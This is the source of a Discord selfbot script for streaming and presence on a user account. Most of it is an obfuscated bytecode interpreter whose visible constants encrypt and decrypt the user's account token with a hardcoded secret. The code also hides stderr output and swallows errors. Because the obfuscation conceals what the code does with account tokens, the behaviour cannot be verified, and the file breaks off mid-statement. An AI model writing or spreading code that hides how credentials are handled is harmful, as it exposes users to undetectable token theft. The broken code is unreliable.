// If it works, don’t touch anything. If you don’t trust it, just read through the src, dawg.
// free shit atleast it works

// rewritten

const { Client, RichPresence, CustomStatus } = require("discord.js-selfbot-v13");
const { Streamer, Utils, prepareStream, playStream } = require("@dank074/discord-video-stream");
const { schedule } = require("node-cron");
const moment = require("moment-timezone");
const os = require("os");
const fs = require("fs");
const path = require("path");
const yaml = require("js-yaml");
const si = require("systeminformation");
const crypto = require("crypto");
const chalkAnimation = require("chalk-animation").default;
require("colors");

const fetch = (...args) => import("node-fetch").then(m => m.default(...args));


const ASCII = `

        ░████░        ░█████░░      
      ░█████████░   ░████████░      
       ███████████████████████░     
      ░████████████████████████     
      █████████████████████████░    
     ██████████████████████████▒░   
     ████████████░  ▒████████████   
     ██████░▒███░   ░███  ░██████▒  
     ████░                 ░▒█████░ 
     ███▓░                   ░█▓██░ 
     ██                             
     ░                              
`;

process.removeAllListeners("warning");
process.on("warning", (warning) => {
  if (!String(warning).includes("DeprecationWarning")) {
    console.warn(warning);
  }
});

const originalStderrWrite = process.stderr.write;
process.stderr.write = (chunk, ...args) => {
  if (typeof chunk === "string" && chunk.includes("The system cannot find the path specified")) {
    return;
  }
  return originalStderrWrite.call(process.stderr, chunk, ...args);
};

const colors = {
  reset: "\x1b[0m",
  bright: "\x1b[1m",
  dim: "\x1b[2m",
  green: "\x1b[32m",
  red: "\x1b[31m",
  yellow: "\x1b[33m",
  blue: "\x1b[34m",
  magenta: "\x1b[35m",
  cyan: "\x1b[36m",
  gray: "\x1b[90m",
};

function fuck_logger(type, message) {
  const now = new Date();
  const timestamp = now.toLocaleTimeString("en-US", {
    hour12: false,
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit"
  });
  const date = now.toLocaleDateString("en-US", {
    month: "2-digit",
    day: "2-digit",
    year: "numeric"
  });

  const tags = {
    success: `${colors.green}${colors.bright}SUCCESS${colors.reset}`,
    error: `${colors.red}${colors.bright}ERROR${colors.reset}`,
    warning: `${colors.yellow}${colors.bright}WARNING${colors.reset}`,
    info: `${colors.blue}${colors.bright}INFO${colors.reset}`,
    debug: `${colors.magenta}${colors.bright}DEBUG${colors.reset}`,
  };

  const tag = tags[type.toLowerCase()] || `${colors.cyan}${colors.bright}LOG${colors.reset}`;
  const timeStr = `${colors.gray}[${date} ${timestamp}]${colors.reset}`;

  console.log(`${timeStr} ${tag} ${colors.dim}→${colors.reset} ${message}`);
}

process.on("uncaughtException", (error) => {
  fuck_logger("error", `[Uncaught Exception] ${error.message}`);
});

process.on("unhandledRejection", (reason, promise) => {
  fuck_logger("error", `[Unhandled Rejection] ${reason}`);
});

process.on("error", (error) => {
  fuck_logger("error", `[Process Error] ${error.message}`);
});


let H=typeof globalThis!=='undefined'?globalThis:typeof window!=='undefined'?window:global,J_132fec=H['J_132fec']||(H['J_132fec']={});const i_3883b9=(function(){let X=[{'\x69':[0x0,0x0,0x7,0x0,0x6,0x0,0x0,0x1,0x4b,0x2,0x4,null,0x46,0x3,0x0,0x4,0x37,0x1,0x4,null,0x46,0x5,0x0,0x4,0x37,0x1,0x4,null,0x46,0x6,0x0,0x7,0x37,0x0,0x38,null],'\x63':["c3BpdGVjb2xsZWN0c2hvd25oYXBwZW50ZW50dGhyb3duZHVldGVhcG9zdHJvbGxhY3I","sha256","crypto","createHash",0x1,"update","digest",0x0],'\x70':0x0,'\x6c':0x1,'\x73\x70':0x1},{'\x69':[0x8,0x0,0x4,null,0x34,null,0x3,null,0xa0,null,0x46,0x0,0x8,0x0,0x4,null,0x46,0x1,0x0,0x2,0x37,0x1,0x38,null],'\x63':["ENC_PREFIX","startsWith",0x1],'\x70':0x1,'\x6c':0x0,'\x6a':{0x2:0xb},'\x73\x70':0x1},{'\x69':[0x3a,null,0xa0,null,0x4,null,0x46,0x0,0x0,0x1,0x37,0x0,0x7,0x1,0x0,0x2,0x4b,0x3,0x4,null,0x46,0x4,0x0,0x5,0x37,0x1,0x7,0x2,0x0,0x6,0x4b,0x3,0x4,null,0x46,0x4,0x0,0x5,0x37,0x1,0x7,0x3,0x6,0x1,0x6,0x3,0x0,0x7,0x0,0x8,0x0,0x9,0x4b,0x3,0x4,null,0x46,0xa,0x0,0xb,0x37,0x5,0x7,0x4,0x0,0xc,0x6,0x4,0x6,0x2,0x4b,0x3,0x4,null,0x46,0xd,0x0,0xe,0x37,0x3,0x7,0x5,0x8,0x0,0x0,0xf,0x0,0x10,0x6,0x5,0x4,null,0x46,0x11,0x0,0xe,0x37,0x3,0x7,0x6,0x6,0x6,0x0,0x10,0x6,0x5,0x4,null,0x46,0x12,0x0,0x5,0x37,0x1,0xa,null,0x4,null,0x7,0x6,0x3,null,0x5a,null,0x0,0x13,0x4b,0x14,0x4,null,0x46,0x15,0x0,0x5,0x37,0x1,0x5b,null,0x6,0x3,0x5b,null,0x6,0x2,0x5b,null,0x6,0x6,0x0,0x10,0x4b,0x14,0x4,null,0x46,0x15,0x0,0x16,0x37,0x2,0x5b,null,0x4b,0x14,0x4,null,0x46,0x17,0x0,0x5,0x37,0x1,0x7,0x7,0xa0,null,0x46,0x18,0x0,0x10,0x6,0x7,0x4,null,0x46,0x19,0x0,0x5,0x37,0x1,0xa,null,0x38,null,0x3b,null,0x32,null,0xd5,0x0,0xd2,0x0,0x3c,0x1a,0x0,0x1b,0x0,0x1c,0xd3,0x1a,0x46,0x1d,0xa,null,0x4b,0x1e,0x0,0x16,0x36,0x2,0x3,null,0x2,null,0x38,null,0xd6,0x0,0x32,null,0x1,null,0x38,null],'\x63':["getSecretKey",0x0,0x10,"crypto","randomBytes",0x1,0x8,0x2710,0x20,"sha256","pbkdf2Sync",0x5,"aes-256-cbc","createCipheriv",0x3,"utf8","base64","update","final","Salted__","Buffer","from",0x2,"concat","ENC_PREFIX","toString","error$$1","error","Token encryption failed: ","message","fuck_logger"],'\x70':0x1,'\x6c':0x7,'\x6a':{0x62:0x73,0x72:0x73},'\x78':{0x0:[0x63,-0x1,0x73]},'\x73\x70':0x1},{'\x69':[0x3a,null,0x8,0x0,0xa0,null,0x4,null,0x46,0x0,0x0,0x1,0x37,0x1,0x20,null,0x34,null,0x8,0x0,0x38,null,0xa0,null,0x4,null,0x46,0x2,0x0,0x3,0x37,0x0,0x7,0x1,0xa0,null,0x46,0x4,0x46,0x5,0x8,0x0,0x4,null,0x46,0x6,0x0,0x1,0x37,0x1,0x0,0x7,0x4b,0x8,0x4,null,0x46,0x9,0x0,0xa,0x37,0x2,0x7,0x2,0x0,0x3,0x0,0xb,0x6,0x2,0x4,null,0x46,0x6,0x0,0xa,0x37,0x2,0x4,null,0x46,0xc,0x0,0x3,0x37,0x0,0x7,0x3,0x6,0x3,0x0,0xd,0x2b,null,0x34,null,0x4b,0xe,0x0,0xf,0x0,0x1,0x68,0x1,0x39,null,0x0,0xb,0x0,0x10,0x6,0x2,0x4,null,0x46,0x6,0x0,0xa,0x37,0x2,0x7,0x4,0x0,0x10,0x0,0x11,0x6,0x2,0x4,null,0x46,0x6,0x0,0xa,0x37,0x2,0x7,0x5,0x0,0x11,0x6,0x2,0x4,null,0x46,0x6,0x0,0x1,0x37,0x1,0x7,0x6,0x6,0x1,0x6,0x4,0x0,0x12,0x0,0x11,0x0,0x13,0x4b,0x14,0x4,null,0x46,0x15,0x0,0x16,0x37,0x5,0x7,0x7,0x0,0x17,0x6,0x7,0x6,0x5,0x4b,0x14,0x4,null,0x46,0x18,0x0,0x19,0x37,0x3,0x7,0x8,0x6,0x6,0x4b,0x1a,0x0,0x1b,0x6,0x8,0x4,null,0x46,0x1c,0x0,0x19,0x37,0x3,0x7,0x9,0x6,0x9,0x0,0x1b,0x6,0x8,0x4,null,0x46,0x1d,0x0,0x1,0x37,0x1,0xa,null,0x4,null,0x7,0x9,0x3,null,0x6,0x9,0x38,null,0x3b,null,0x32,null,0xd5,0x0,0xd2,0x0,0x3c,0x1e,0x0,0x1f,0x0,0x20,0xd3,0x1e,0x46,0x21,0xa,null,0x4b,0x22,0x0,0xa,0x36,0x2,0x3,null,0x2,null,0x38,null,0xd6,0x0,0x32,null,0x1,null,0x38,null],'\x63':["isEncrypted",0x1,"getSecretKey",0x0,"ENC_PREFIX","length","slice","base64","Buffer","from",0x2,0x8,"toString","Salted__","Error","Invalid encrypted token format",0x10,0x20,0x2710,"sha256","crypto","pbkdf2Sync",0x5,"aes-256-cbc","createDecipheriv",0x3,"undefined","utf8","update","final","error$$1","error","Token decryption failed: ","message","fuck_logger"],'\x70':0x1,'\x6c':0x9,'\x6a':{0x8:0xb,0x2f:0x35,0x77:0x88,0x87:0x88},'\x78':{0x0:[0x78,-0x1,0x88]},'\x73\x70':0x1},{'\x69':[0x8,0x0,0x20,null,0x34,null,0x2,null,0x38,null,0xa2,0x10000,0x0,0x2,0x8,0x0,0x4,null,0x46,0x3,0x0,0x4,0x37,0x2,0x4,null,0x46,0x5,0x0,0x6,0x37,0x0,0x7,0x1,0x6,0x1,0xa0,null,0x4,null,0x46,0x7,0x0,0x8,0x37,0x1,0x34,null,0x6,0x1,0xa0,null,0x4,null,0x46,0x9,0x0,0x8,0x37,0x1,0x7,0x2,0x6,0x2,0x34,null,0x0,0xa,0x0,0xb,0x4b,0xc,0x0,0x4,0x36,0x2,0x3,null,0x6,0x2,0x38,null,0x2,null,0x38,null,0x6,0x1,0x38,null],'\x63':["[\"']","g","","replace",0x2,"trim",0x0,"isEncrypted",0x1,"decrypt","info","Using encrypted token (decrypted successfully)","fuck_logger"],'\x70':0x1,'\x6c':0x2,'\x6a':{0x2:0x5,0x17:0x2b,0x20:0x29},'\x73\x70':0x1},{'\x69':[0x8,0x0,0x4b,0x0,0x4,null,0x46,0x1,0x0,0x2,0x37,0x1,0x7,0x1,0x0,0x3,0x4b,0x4,0x4,null,0x46,0x5,0x0,0x2,0x37,0x1,0x3,null,0x6,0x1,0x4b,0x4,0x4,null,0x46,0x5,0x0,0x2,0x37,0x1,0x3,null,0x0,0x6,0x4b,0x4,0x4,null,0x46,0x5,0x0,0x2,0x37,0x1,0x3,null,0x6,0x1,0x38,null],'\x63':["TokenCrypto","encrypt",0x1,"\n=== Encrypted Token ===","console","log","\nPaste this value in your config.yml token field"],'\x70':0x1,'\x6c':0x1,'\x73\x70':0x1}];function m(F){return X[F];}for(let F=0x0;F<X['\x6c'+'\x65'+'\x6e'+'\x67'+'\x74'+'\x68'];F++){let v=X[F];if(v['c'])for(let a=0x0;a<v['c']['\x6c'+'\x65'+'\x6e'+'\x67'+'\x74'+'\x68'];a++){let t=v['c'][a];if(typeof t==='string'&&t['\x6c'+'\x65'+'\x6e'+'\x67'+'\x74'+'\x68']>0x1&&t[t['\x6c'+'\x65'+'\x6e'+'\x67'+'\x74'+'\x68']-0x1]==='n')try{v['c'][a]=BigInt(t['\x73'+'\x6c'+'\x69'+'\x63'+'\x65'](0x0,-0x1));}catch(U){}}}let r={0x0:0x1b8,0x1:0x1d7,0x2:0x1c,0x3:0x152,0x4:0xcf,0x5:0xec,0x6:0x69,0x7:0xf5,0x8:0xd,0x9:0x5c,0xa:0x1b2,0xb:0x2,0xc:0x176,0xd:0x5f,0xe:0x46,0xf:0x100,0x10:0x24,0x11:0x31,0x12:0x178,0x13:0x154,0x14:0xf8,0x15:0x9a,0x16:0x1d4,0x17:0xb4,0x18:0x1dc,0x19:0x8d,0x1a:0x10d,0x1b:0xc5,0x20:0x1af,0x28:0xc0,0x29:0x1e2,0x2a:0x98,0x2b:0xe1,0x2c:0x83,0x2d:0xdd,0x2e:0x121,0x2f:0x1e9,0x32:0x2b,0x33:0x196,0x34:0x169,0x35:0x166,0x36:0x80,0x37:0x1b9,0x38:0x1a7,0x39:0x1f3,0x3a:0x5e,0x3b:0x159,0x3c:0x1d5,0x3d:0x90,0x3e:0x185,0x3f:0x1b7,0x40:0x171,0x41:0x7a,0x46:0xbd,0x47:0x7c,0x48:0x1e0,0x49:0x157,0x4a:0x1,0x4b:0x17c,0x4c:0x76,0x4d:0x1ba,0x4e:0x44,0x4f:0x68,0x50:0x11e,0x51:0x25,0x52:0x4b,0x5a:0x186,0x5b:0x12f,0x5c:0x19a,0x5d:0xfd,0x5e:0xfa,0x5f:0x9c,0x64:0x57,0x65:0x58,0x66:0xe7,0x67:0x134,0x68:0x6b,0x69:0x1fd,0x6a:0xc9,0x6b:0x10b,0x6e:0x1f8,0x6f:0x1a2,0x70:0x66,0x78:0xc8,0x79:0x11b,0x7a:0x15d,0x7b:0x14f,0x7c:0x2f,0x7d:0xd3,0x7e:0x59,0x7f:0x135,0x80:0x86,0x81:0x91,0x82:0xfc,0x83:0xe8,0x84:0x103,0x8c:0x1c3,0x8d:0x14c,0x8e:0x16a,0x8f:0x191,0x90:0x19e,0x91:0x35,0x92:0x6e,0x93:0xe3,0x94:0x1c1,0x95:0x9f,0x96:0x1d,0x97:0x1ab,0x98:0x60,0x99:0x174,0x9a:0xc3,0x9b:0x71,0x9c:0x39,0x9d:0x2e,0x9e:0x15c,0xa0:0xd4,0xa1:0x1ca,0xa2:0x75,0xa3:0xc2,0xa4:0xd1,0xa6:0xed,0xa7:0x15b,0xa8:0x110,0xa9:0xc6,0xaa:0xa7,0xab:0x147,0xac:0x9e,0xad:0xe9,0xae:0x179,0xaf:0x168,0xc8:0x9b,0xc9:0xae,0xca:0x1c6,0xd2:0x1ef,0xd3:0xba,0xd4:0xa6,0xd5:0x19b,0xd6:0x194,0xd7:0x63,0xd8:0xee,0xd9:0x10,0xda:0x1f6,0xdb:0x6a,0xfa:0x51,0xfb:0x4a,0xfc:0x34,0xfd:0xb6,0xfe:0xbf,0xff:0x139,0x100:0x1ee,0x101:0x1d6,0x102:0x12d,0x103:0x1ea,0x104:0x1f5,0x105:0x1e7},D=new WeakSet();function l(N,w){let c=[];for(let M=0x0;M<w;M++){let W=N();if(W&&typeof W==='object'&&D['\x68'+'\x61'+'\x73'](W)){let p=W['\x76'+'\x61'+'\x6c'+'\x75'+'\x65'];if(Array['\x69'+'\x73'+'\x41'+'\x72'+'\x72'+'\x61'+'\x79'](p))for(let I=p['\x6c'+'\x65'+'\x6e'+'\x67'+'\x74'+'\x68']-0x1;I>=0x0;I--){c['\x70'+'\x75'+'\x73'+'\x68'](p[I]);}}else c['\x70'+'\x75'+'\x73'+'\x68'](W);}return c['\x72'+'\x65'+'\x76'+'\x65'+'\x72'+'\x73'+'\x65'](),c;}function n(N){let w=[];for(let c in N){w['\x70'+'\x75'+'\x73'+'\x68'](c);}return w;}let g=![],C=0x0,u=0x0,d=![],q=0x1388,B=0x3;function j(){if(!g||d)return;let N=Date['\x6e'+'\x6f'+'\x77']();if(C===0x0){C=N;return;}let w=N-C;C=N;if(w>q){u++;if(u>=B){d=!![];for(let c in r){r[c]=r[c]+0x1&0x1ff;}}}else u=0x0;}function P(N,w,c,M,W,p){let I=[],V=0x0,s=new Array((N['p']||0x0)+(N['l']||0x0)),Q=0x0,k=N['c'],h=N['i'],L=N['j']||{},z=N['x']||{},Z=h['\x6c'+'\x65'+'\x6e'+'\x67'+'\x74'+'\x68']>>0x1,T=[],x0=null,x1={['\x5f'+'\x24'+'\x42'+'\x4c'+'\x48'+'\x71'+'\x63'+'\x4b']:![],['\x5f'+'\x24'+'\x68'+'\x47'+'\x35'+'\x79'+'\x4d'+'\x54']:undefined},x2={['\x5f'+'\x24'+'\x76'+'\x6a'+'\x75'+'\x66'+'\x59'+'\x46']:![],['\x5f'+'\x24'+'\x63'+'\x4c'+'\x31'+'\x61'+'\x68'+'\x70']:0x0},x3={['\x5f'+'\x24'+'\x67'+'\x46'+'\x69'+'\x69'+'\x79'+'\x65']:![],['\x5f'+'\x24'+'\x4e'+'\x64'+'\x32'+'\x44'+'\x6d'+'\x4d']:0x0},x4=N['o']||r,x5=!!N['st'],x6=!!N['sp'];var x7=0x0,x8=null;let x9=N['seKey'],xx,xR,xS,xb,xi,xA;if(x9!==undefined){let xr=xD=>typeof xD==='number'&&Number['\x69'+'\x73'+'\x46'+'\x69'+'\x6e'+'\x69'+'\x74'+'\x65'](xD)&&Number['\x69'+'\x73'+'\x49'+'\x6e'+'\x74'+'\x65'+'\x67'+'\x65'+'\x72'](xD)&&xD>=-0x80000000&&xD<=0x7fffffff&&!Object['\x69'+'\x73'](xD,-0x0)?xD^x9|0x0:xD;xx=xD=>{I[V++]=xr(xD);},xR=()=>xr(I[--V]),xS=()=>xr(I[V-0x1]),xb=xD=>{I[V-0x1]=xr(xD);},xi=xD=>xr(I[V-xD]),xA=(xD,xl)=>{I[V-xD]=xr(xl);};}else xx=xD=>{I[V++]=xD;},xR=()=>I[--V],xS=()=>I[V-0x1],xb=xD=>{I[V-0x1]=xD;},xi=xD=>I[V-xD],xA=(xD,xl)=>{I[V-xD]=xl;};let xY=xD=>xD,xy={['\x5f'+'\x24'+'\x68'+'\x31'+'\x64'+'\x56'+'\x6f'+'\x62']:c,['\x5f'+'\x24'+'\x54'+'\x44'+'\x69'+'\x57'+'\x6c'+'\x48']:Object['\x63'+'\x72'+'\x65'+'\x61'+'\x74'+'\x65'](null)};if(w)for(let xD=0x0;xD<Math['\x6d'+'\x69'+'\x6e'](w['\x6c'+'\x65'+'\x6e'+'\x67'+'\x74'+'\x68'],N['p']||0x0);xD++){s[xD]=w[xD];}let xo=null,xK=![];if(N['ni']!==undefined&&M){let xl=N['c'][N['ni']];xy['_$TDiWlH'][xl]=M;if(N['nfe']){if(!xy['_$W7Fy6A'])xy['_$W7Fy6A']={};xy['_$W7Fy6A'][xl]=!![];}try{Object['\x64'+'\x65'+'\x66'+'\x69'+'\x6e'+'\x65'+'\x50'+'\x72'+'\x6f'+'\x70'+'\x65'+'\x72'+'\x74'+'\x79'](M,'name',{'\x76\x61\x6c\x75\x65':xl,'\x77\x72\x69\x74\x61\x62\x6c\x65':![],'\x65\x6e\x75\x6d\x65\x72\x61\x62\x6c\x65':![],'\x63\x6f\x6e\x66\x69\x67\x75\x72\x61\x62\x6c\x65':!![]});}catch(xn){}}while(Q<Z){try{while(Q<Z){let xg=Q<<0x1,xC=h[xg],xu=xC,xd=x4[xu],xq=h[xg+0x1],xB=xq===null?undefined:xq;if(typeof xm==='undefined')var xJ=![],xH,xX={0x0:0x41,0x1:0x6a,0x2:0x6f,0x3:0x65,0x4:0x25,0x5:0x2e,0x6:0x5e,0x7:0x24,0x8:0x28,0x9:0x0,0xa:0x53,0xb:0x44,0xc:0x36,0xd:0x34,0xe:0x3f,0xf:0x3c,0x10:0x8,0x11:0x84,0x12:0x3e,0x13:0x13,0x14:0x10,0x15:0x74,0x16:0x58,0x17:0x2,0x18:0x7c,0x19:0x4,0x1a:0x4a,0x1b:0x22,0x20:0x6c,0x28:0x30,0x29:0x43,0x2a:0x1a,0x2b:0x7b,0x2c:0x8d,0x2d:0x15,0x2e:0x4c,0x2f:0x12,0x32:0x56,0x33:0x19,0x34:0x46,0x35:0x70,0x36:0x14,0x37:0x5c,0x38:0x51,0x39:0x39,0x3a:0x76,0x3b:0x64,0x3c:0x78,0x3d:0x11,0x3e:0x7a,0x3f:0x5d,0x40:0x79,0x46:0x61,0x47:0x42,0x48:0x71,0x49:0x50,0x4a:0x69,0x4b:0x38,0x4c:0x33,0x4d:0x5,0x4e:0x7,0x4f:0x3b,0x51:0x3a,0x52:0x4b,0x5a:0xd,0x5b:0x1e,0x5d:0x7e,0x5e:0x45,0x5f:0x54,0x64:0x27,0x68:0x4d,0x69:0x5f,0x6a:0x6e,0x6e:0x55,0x6f:0x1c,0x70:0x83,0x7b:0x73,0x7c:0x89,0x7f:0x29,0x80:0x3d,0x81:0x35,0x82:0xa,0x83:0x5a,0x84:0x63,0x8c:0x2b,0x8d:0x20,0x8e:0x2f,0x8f:0x62,0x90:0x66,0x91:0x80,0x92:0x82,0x93:0x85,0x94:0x67,0x95:0x75,0x96:0x37,0x97:0x6,0x98:0x57,0x99:0x47,0x9a:0x3,0x9b:0x52,0x9c:0x6d,0x9d:0x21,0x9e:0x17,0xa0:0x5b,0xa1:0x72,0xa2:0x49,0xa3:0x8a,0xa4:0x40,0xa7:0x1b,0xa8:0x32,0xa9:0x68,0xaa:0x16,0xab:0x8b,0xac:0x23,0xad:0x88,0xae:0xc,0xaf:0x4f,0xc8:0x87,0xc9:0x1,0xca:0x2c,0xd2:0xe,0xd3:0x31,0xd4:0x9,0xd5:0x48,0xd6:0x81,0xd7:0x4e,0xd8:0x2a,0xd9:0x59,0xda:0x86,0xdb:0x26,0xfa:0x7f,0xfb:0x1d,0xfc:0x18,0xfd:0x7d,0xfe:0x77,0xff:0x60,0x100:0xf,0x101:0xb,0x102:0x1f,0x103:0x6b,0x104:0x2d,0x105:0x8c},xm=[function(xj){while(!![]){w[xj]=xR(),Q++;break;}},function(xj){while(!![]){Q++;break;}},function(xj){while(!![]){xx(~xR()),Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=xR(),xE=k[xj],xO=null;if(J_132fec['_$iZ9Ctg']){let xF=J_132fec['_$iZ9Ctg'],xv=xF['\x67'+'\x65'+'\x74'](xE);xv&&xv['\x68'+'\x61'+'\x73'](xe)&&(xO=xv['\x67'+'\x65'+'\x74'](xe));}if(xO===null){let xa='_$HnpK5c'+xE['\x73'+'\x75'+'\x62'+'\x73'+'\x74'+'\x72'+'\x69'+'\x6e'+'\x67'](0x1)+'_$7iRR7j';xa in xe&&(xO=xe[xa]);}if(xO===null)throw new TypeError("Cannot read private member "+xE+" from an object whose class did not declare it");if(typeof xO!=='function')throw new TypeError(xE+" is not a function");let xf=[];for(let xt=0x0;xt<xP;xt++){xf['\x75'+'\x6e'+'\x73'+'\x68'+'\x69'+'\x66'+'\x74'](xR());}let xG=xO['\x61'+'\x70'+'\x70'+'\x6c'+'\x79'](xe,xf);xx(xG),Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=xR();xx(xe>>xP),Q++;break;}},function(xj){while(!![]){xx({}),Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=xR(),xE=k[xj];!J_132fec['_$iZ9Ctg']&&(J_132fec['_$iZ9Ctg']=new Map());let xO=J_132fec['_$iZ9Ctg'],xf="set_"+xE,xG=xO['\x67'+'\x65'+'\x74'](xf);if(xG&&xG['\x68'+'\x61'+'\x73'](xe)){let xt=xG['\x67'+'\x65'+'\x74'](xe);xt['\x63'+'\x61'+'\x6c'+'\x6c'](xe,xP),xx(xP),Q++;break;}let xF='_$HnpK5c'+"set_"+xE['\x73'+'\x75'+'\x62'+'\x73'+'\x74'+'\x72'+'\x69'+'\x6e'+'\x67'](0x1)+'_$7iRR7j';if(xe['\x63'+'\x6f'+'\x6e'+'\x73'+'\x74'+'\x72'+'\x75'+'\x63'+'\x74'+'\x6f'+'\x72']&&xF in xe['\x63'+'\x6f'+'\x6e'+'\x73'+'\x74'+'\x72'+'\x75'+'\x63'+'\x74'+'\x6f'+'\x72']){let xU=xe['\x63'+'\x6f'+'\x6e'+'\x73'+'\x74'+'\x72'+'\x75'+'\x63'+'\x74'+'\x6f'+'\x72'][xF];xU['\x63'+'\x61'+'\x6c'+'\x6c'](xe,xP),xx(xP),Q++;break;}let xv=xO['\x67'+'\x65'+'\x74'](xE);if(xv&&xv['\x68'+'\x61'+'\x73'](xe)){xv['\x73'+'\x65'+'\x74'](xe,xP),xx(xP),Q++;break;}let xa='_$5nAHRc'+xE['\x73'+'\x75'+'\x62'+'\x73'+'\x74'+'\x72'+'\x69'+'\x6e'+'\x67'](0x1)+'_$NTag4F';if(xa in xe){xe[xa]=xP,xx(xP),Q++;break;}throw new TypeError("Cannot write private member "+xE+" to an object whose class did not declare it");break;}},function(xj){while(!![]){let xP=xR(),xe=k[xj];xP===null||xP===undefined?xx(undefined):xx(xP[xe]);Q++;break;}},function(xj){while(!![]){let xP=xR();xx(typeof xP==='bigint'?xP+0x1n:xP+0x1),Q++;break;}},function(xj){while(!![]){let xP=k[xj],xe=xR(),xE=xy,xO=![];while(xE){if(xE['_$TDiWlH']&&xP in xE['_$TDiWlH']){if(xE['_$W7Fy6A']&&xP in xE['_$W7Fy6A'])throw new TypeError('Assignment to constant variable.');xE['_$aVHknk']&&xP in xE['_$aVHknk']&&delete xE['_$aVHknk'][xP];xE['_$TDiWlH'][xP]=xe,xO=!![];break;}xE=xE['_$h1dVob'];}if(!xO){if(xP in J_132fec)J_132fec[xP]=xe;else xP in H?H[xP]=xe:H[xP]=xe;}Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=xP['\x6e'+'\x65'+'\x78'+'\x74']();xx(Promise['\x72'+'\x65'+'\x73'+'\x6f'+'\x6c'+'\x76'+'\x65'](xe)),Q++;break;}},function(xj){while(!![]){let xP=xj&0xffff,xe=xj>>>0x10;s[xP]<k[xe]?Q=xY(L[Q]):Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=xR(),xE=xS();Object['\x64'+'\x65'+'\x66'+'\x69'+'\x6e'+'\x65'+'\x50'+'\x72'+'\x6f'+'\x70'+'\x65'+'\x72'+'\x74'+'\x79'](xE,xe,{'\x67\x65\x74':xP,'\x65\x6e\x75\x6d\x65\x72\x61\x62\x6c\x65':![],'\x63\x6f\x6e\x66\x69\x67\x75\x72\x61\x62\x6c\x65':!![]}),Q++;break;}},function(xj){while(!![]){xx([]),Q++;break;}},function(xj){while(!![]){let xP=xR(),xe={['\x5f'+'\x24'+'\x54'+'\x44'+'\x69'+'\x57'+'\x6c'+'\x48']:Object['\x63'+'\x72'+'\x65'+'\x61'+'\x74'+'\x65'](null),['\x5f'+'\x24'+'\x57'+'\x37'+'\x46'+'\x79'+'\x36'+'\x41']:Object['\x63'+'\x72'+'\x65'+'\x61'+'\x74'+'\x65'](null),['\x5f'+'\x24'+'\x61'+'\x56'+'\x48'+'\x6b'+'\x6e'+'\x6b']:Object['\x63'+'\x72'+'\x65'+'\x61'+'\x74'+'\x65'](null),['\x5f'+'\x24'+'\x68'+'\x31'+'\x64'+'\x56'+'\x6f'+'\x62']:xP};xy=xe,Q++;break;}},function(xj){while(!![]){let xP=xj&0xffff,xe=xj>>>0x10;xx(s[xP]<k[xe]),Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=xR();xx(xe&xP),Q++;break;}},function(xj){while(!![]){if(T['\x6c'+'\x65'+'\x6e'+'\x67'+'\x74'+'\x68']>0x0){let xP=T[T['\x6c'+'\x65'+'\x6e'+'\x67'+'\x74'+'\x68']-0x1];xP['_$I5WncY']===Q&&(xP['_$UzO0c6']!==undefined&&(x0=xP['_$UzO0c6']),T['\x70'+'\x6f'+'\x70']());}Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=xR();xx(xe>=xP),Q++;break;}},function(xj){while(!![]){xx(+xR()),Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=xR(),xE=J_132fec['_$pa13eK'];J_132fec['_$pa13eK']=undefined;try{let xO=xe['\x61'+'\x70'+'\x70'+'\x6c'+'\x79'](undefined,l(xR,xP));xx(xO);}finally{J_132fec['_$pa13eK']=xE;}Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=xR();xx(xe<=xP),Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=xR(),xE=xS();Object['\x64'+'\x65'+'\x66'+'\x69'+'\x6e'+'\x65'+'\x50'+'\x72'+'\x6f'+'\x70'+'\x65'+'\x72'+'\x74'+'\x79'](xE['\x70'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65'],xe,{'\x76\x61\x6c\x75\x65':xP,'\x77\x72\x69\x74\x61\x62\x6c\x65':!![],'\x65\x6e\x75\x6d\x65\x72\x61\x62\x6c\x65':![],'\x63\x6f\x6e\x66\x69\x67\x75\x72\x61\x62\x6c\x65':!![]}),Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=xR(),xE=k[xj];if(J_132fec['_$iZ9Ctg']){let xf=J_132fec['_$iZ9Ctg'],xG="set_"+xE,xF=xf['\x67'+'\x65'+'\x74'](xG);if(xF&&xF['\x68'+'\x61'+'\x73'](xe)){let xa=xF['\x67'+'\x65'+'\x74'](xe);xa['\x63'+'\x61'+'\x6c'+'\x6c'](xe,xP),xx(xP),Q++;break;}let xv=xf['\x67'+'\x65'+'\x74'](xE);if(xv&&xv['\x68'+'\x61'+'\x73'](xe)){xv['\x73'+'\x65'+'\x74'](xe,xP),xx(xP),Q++;break;}}let xO='_$5nAHRc'+xE['\x73'+'\x75'+'\x62'+'\x73'+'\x74'+'\x72'+'\x69'+'\x6e'+'\x67'](0x1)+'_$NTag4F';if(xO in xe){xe[xO]=xP,xx(xP),Q++;break;}throw new TypeError("Cannot write private member "+xE+" to an object whose class did not declare it");break;}},function(xj){while(!![]){let xP=xj&0xffff,xe=xj>>>0x10;xx(s[xP]+k[xe]),Q++;break;}},function(xj){while(!![]){xR()?Q=xY(L[Q]):Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=xR();xx(xe===xP),Q++;break;}},function(xj){while(!![]){if(xj===-0x1)xx(Symbol());else{let xP=xR();xx(Symbol(xP));}Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=xR();xx(xe instanceof xP),Q++;break;}},function(xj){while(!![]){s[xj]=s[xj]-0x1,Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=xS();xe['\x70'+'\x75'+'\x73'+'\x68'](xP),Q++;break;}},function(xj){while(!![]){let xP=xj&0xffff,xe=xj>>>0x10,xE=xR(),xO=l(xR,xE),xf=s[xP],xG=k[xe],xF=xf[xG];xx(xF['\x61'+'\x70'+'\x70'+'\x6c'+'\x79'](xf,xO)),Q++;break;}},function(xj){while(!![]){let 